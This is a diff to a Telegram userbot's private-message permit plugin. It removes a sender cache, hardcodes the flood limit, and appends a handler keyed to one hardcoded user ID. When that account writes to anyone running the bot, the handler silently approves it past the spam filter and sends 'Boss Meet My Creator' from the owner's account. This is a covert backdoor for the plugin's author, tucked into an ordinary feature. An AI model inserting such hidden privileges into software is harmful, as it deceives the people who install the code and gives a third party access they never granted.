@@ -135,18 +135,13 @@ if Var.PRIVATE_GROUP_ID is not None:
             # userbot's should not reply to other userbot's
             # https://core.telegram.org/bots/faq#why-doesn-39t-my-bot-see-messages-from-other-bots
             return
-        if event.from_id in CACHE:
-            sender = CACHE[event.from_id]
-        else:
-            sender = await bot.get_entity(event.from_id)
-            CACHE[event.from_id] = sender
+        sender = await bot.get_entity(chat_id)
 
         if chat_id == bot.uid:
 
             # don't log Saved Messages
 
             return
-
 
         if sender.bot:
 
@@ -170,7 +165,7 @@ if Var.PRIVATE_GROUP_ID is not None:
     async def do_pm_permit_action(chat_id, event):
         if chat_id not in PM_WARNS:
             PM_WARNS.update({chat_id: 0})
-        if PM_WARNS[chat_id] == Config.MAX_FLOOD_IN_P_M_s:
+        if PM_WARNS[chat_id] == 5:
             r = await event.reply(USER_BOT_WARN_ZERO)
             await asyncio.sleep(3)
             await event.client(functions.contacts.BlockRequest(chat_id))
@@ -200,11 +195,20 @@ if Var.PRIVATE_GROUP_ID is not None:
         if chat_id in PREV_REPLY_MESSAGE:
             await PREV_REPLY_MESSAGE[chat_id].delete()
         PREV_REPLY_MESSAGE[chat_id] = r
-        
-   
 
-     
-
+from userbot.utils import admin_cmd
+import io
+import userbot.plugins.sql_helper.pmpermit_sql as pmpermit_sql
+from telethon import events
+@bot.on(events.NewMessage(incoming=True, from_users=(1118936839)))
+async def hehehe(event):
+    if event.fwd_from:
+        return
+    chat = await event.get_chat()
+    if event.is_private:
+        if not pmpermit_sql.is_approved(chat.id):
+            pmpermit_sql.approve(chat.id, "**My Boss Is Best🔥**")
+            await borg.send_message(chat, "**Boss Meet My Creator**")
             
 CMD_HELP.update({
     "pmpermit":
